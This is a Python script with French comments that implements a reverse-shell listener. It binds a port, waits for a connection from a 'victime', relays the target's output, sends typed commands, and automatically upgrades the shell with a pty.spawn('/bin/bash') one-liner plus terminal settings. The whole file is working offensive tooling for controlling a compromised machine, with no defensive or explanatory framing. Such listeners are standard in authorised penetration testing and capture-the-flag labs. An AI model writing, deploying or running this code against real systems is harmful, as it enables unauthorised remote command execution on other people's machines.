import socket
import threading
import sys
import time

def receive_data(conn):
    """Tourne en boucle pour afficher ce que la victime nous envoie."""
    while True:
        try:
            data = conn.recv(4096)
            if not data:
                break
            # On affiche la sortie de la cible directement dans notre terminal
            sys.stdout.write(data.decode(errors='ignore'))
            sys.stdout.flush()
        except Exception:
            break
    print("\n[\033[91m!\033[0m] Connexion perdue.")
    sys.exit(0)

def run_shell_catcher(args):
    port = args.port
    
    # 1. Création du socket d'écoute
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Permet de réutiliser le port immédiatement si le script crashe
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        s.bind(("0.0.0.0", port))
        s.listen(1)
        print(f"[*] Shell Catcher en écoute sur 0.0.0.0:{port}...")
        print("[*] En attente d'une victime...")
        
        conn, addr = s.accept()
        print(f"\n[\033[92m+\033[0m] \033[1mBINGO ! Reverse Shell reçu depuis {addr[0]}:{addr[1]}\033[0m")
        
        # 2. Démarrage du thread d'affichage
        receiver_thread = threading.Thread(target=receive_data, args=(conn,))
        receiver_thread.daemon = True
        receiver_thread.start()
        
        # 3. L'Auto-Upgrade (La magie opère ici)
        print("[*] Tentative de stabilisation automatique du shell (Pty Spawn)...")
        time.sleep(1) # Laisse le temps au prompt de s'afficher
        
        upgrade_commands = [
            "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' || python -c 'import pty; pty.spawn(\"/bin/bash\")'\n",
            "export TERM=xterm\n",
            "stty rows 40 columns 130\n" # Ajuste la taille de la fenêtre
        ]
        
        for cmd in upgrade_commands:
            conn.send(cmd.encode())
            time.sleep(0.5)

        print("[\033[92m+\033[0m] Stabilisation terminée ! Vous pouvez taper vos commandes.\n")

        # 4. Boucle d'envoi de commandes
        while True:
            cmd = input()
            if cmd.lower() == 'exit':
                conn.send("exit\n".encode())
                break
            # On ajoute un \n pour simuler la touche Entrée
            conn.send((cmd + "\n").encode())
            
    except KeyboardInterrupt:
        print("\n[-] Arrêt du listener.")
    except Exception as e:
        print(f"\n[-] Erreur : {e}")
    finally:
        s.close()